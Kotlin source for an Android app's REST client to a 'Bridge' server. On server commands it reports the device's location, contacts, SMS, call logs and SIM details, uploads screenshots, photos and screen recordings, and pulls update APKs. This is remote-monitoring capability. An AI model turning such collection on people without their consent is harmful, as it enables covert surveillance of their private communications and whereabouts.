package my.bridge.com.core.network.api

import com.google.gson.Gson
import my.bridge.com.core.network.ws.ServerAddress
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.OkHttpClient
import okhttp3.ResponseBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

/**
 * Bridge 后端 REST 客户端封装。
 *
 * 基于 Retrofit 暴露 [BridgeApi]，供设备注册、日志上传等调用。
 * 实例经 Hilt 注入（见 app 层 NetworkModule）。
 *
 * 服务地址可配：每次调用按当前 [ServerAddress.restBaseUrl] 动态构建 Retrofit，
 * 因此用户修改服务地址后无需重建本对象即可生效（Retrofit 构建轻量，
 * 重资源 OkHttpClient 复用）。
 */
class BridgeApiClient(
    private val okHttpClient: OkHttpClient,
    private val gson: Gson,
) {

    /** 按当前服务地址构建 Retrofit 并创建 API 接口。 */
    private fun api(): BridgeApi =
        Retrofit.Builder()
            .baseUrl(ServerAddress.restBaseUrl())
            .client(okHttpClient)
            .addConverterFactory(GsonConverterFactory.create(gson))
            .build()
            .create(BridgeApi::class.java)

    /** 注册设备，返回 token（失败抛异常，由调用方处理）。 */
    suspend fun registerDevice(deviceId: String, deviceName: String? = null): String =
        api().registerDevice(BridgeApi.RegisterRequest(device_id = deviceId, device_name = deviceName)).token

    /** 上传诊断日志（结构化行数组），返回服务端 message（失败抛异常，由调用方处理）。 */
    suspend fun uploadLog(
        deviceId: String,
        logs: List<BridgeApi.LogLine>,
        content: String = "",
        deviceName: String = "",
        appVersion: String = "",
    ): String = api().uploadLog(
        BridgeApi.LogUploadRequest(
            device_id = deviceId,
            logs = logs,
            content = content,
            device_name = deviceName,
            app_version = appVersion,
        )
    ).message

    /**
     * 下载服务器共享目录的音乐文件（play_music 裸文件名音源）。
     * 404 等失败抛异常（HttpException，由调用方区分处理），调用方负责关闭响应体。
     */
    suspend fun downloadMusic(
        filename: String,
        deviceId: String,
        token: String?,
    ): ResponseBody = api().downloadMusic(filename, deviceId, token)

    /**
     * 上报一次位置（get_location 成功后 fire-and-forget）。
     * 失败抛异常，调用方应静默处理（存档不影响命令回执）。
     */
    suspend fun reportLocation(
        deviceId: String,
        token: String?,
        latitude: Double,
        longitude: Double,
        accuracy: Double,
        provider: String,
        altitude: Double?,
        speed: Double?,
        fixTimeMs: Long,
    ): String = api().reportLocation(
        deviceId,
        token,
        BridgeApi.LocationReportRequest(
            device_id = deviceId,
            latitude = latitude,
            longitude = longitude,
            accuracy = accuracy,
            provider = provider,
            altitude = altitude,
            speed = speed,
            fix_time_ms = fixTimeMs,
        ),
    ).action

    /**
     * 上报通讯录快照（get_contacts）。失败抛异常，由调用方决定回执语义
     * （通讯录是命令主产物，上报失败应在回执中注明）。
     */
    suspend fun reportContacts(
        deviceId: String,
        token: String?,
        contacts: List<BridgeApi.ContactItem>,
    ): Int = api().reportContacts(
        deviceId,
        token,
        BridgeApi.ContactsReportRequest(contacts = contacts),
    ).total

    /**
     * 上报一批短信（get_sms，服务端去重）。失败抛异常，由调用方处理。
     */
    suspend fun reportSmsBatch(
        deviceId: String,
        token: String?,
        messages: List<BridgeApi.SmsItem>,
    ): BridgeApi.SmsReportResponse = api().reportSms(
        deviceId,
        token,
        BridgeApi.SmsReportRequest(messages = messages),
    )

    /**
     * 上报通话记录快照（get_call_log）。失败抛异常，由调用方处理。
     */
    suspend fun reportCallLogs(
        deviceId: String,
        token: String?,
        records: List<BridgeApi.CallLogItem>,
    ): Int = api().reportCallLogs(
        deviceId,
        token,
        BridgeApi.CallLogReportRequest(records = records),
    ).total

    /**
     * 上报 SIM 卡信息快照（get_sim_info）。失败抛异常，由调用方处理。
     */
    suspend fun reportSims(
        deviceId: String,
        token: String?,
        sims: List<BridgeApi.SimItem>,
    ): Int = api().reportSims(
        deviceId,
        token,
        BridgeApi.SimReportRequest(sims = sims),
    ).total

    /**
     * 上传媒体文件（截屏/拍照/录屏产物）。失败抛异常，由调用方决定回执语义。
     * kind: "screenshot" / "photo" / "screen_record"。
     */
    suspend fun uploadMedia(
        deviceId: String,
        token: String?,
        kind: String,
        file: MultipartBody.Part,
    ): BridgeApi.MediaUploadResponse {
        val kindBody = RequestBody.create(MultipartBody.FORM, kind)
        return api().uploadMedia(deviceId, token, kindBody, file)
    }

    /**
     * 检查更新（check_update）。服务端扫描 updates 目录返回最新版本信息。
     */
    suspend fun getLatestUpdate(
        deviceId: String,
        token: String?,
        currentVersion: String,
    ): BridgeApi.LatestUpdateResponse = api().getLatestUpdate(deviceId, token, currentVersion)

    /**
     * 下载更新 APK（自动更新）。失败抛异常（HttpException），调用方负责关闭
     * 响应体并写盘（先 .tmp 再原子重命名，与音乐下载同套路）。
     */
    suspend fun downloadUpdate(
        filename: String,
        deviceId: String,
        token: String?,
    ): ResponseBody = api().downloadUpdate(filename, deviceId, token)

    /**
     * 跨设备聚合会话列表（APK 短信页聚合模式，2026-10-28）。
     * 失败抛异常（服务端不可达 / 存档库不可用），由调用方处理。
     */
    suspend fun getSmsThreads(
        deviceId: String,
        token: String?,
        keyword: String? = null,
        limit: Int = 200,
    ): BridgeApi.SmsThreadsResponse = api().getSmsThreads(deviceId, token, keyword, limit)

    /**
     * 某聚合会话（设备+号码）的消息分页（倒序）。失败抛异常，由调用方处理。
     */
    suspend fun getSmsMessages(
        deviceId: String,
        token: String?,
        threadDeviceId: String,
        address: String,
        beforeMs: Long? = null,
        limit: Int = 100,
    ): BridgeApi.SmsMessagesResponse = api().getSmsMessages(
        deviceId, token, threadDeviceId, address, beforeMs, limit,
    )
}
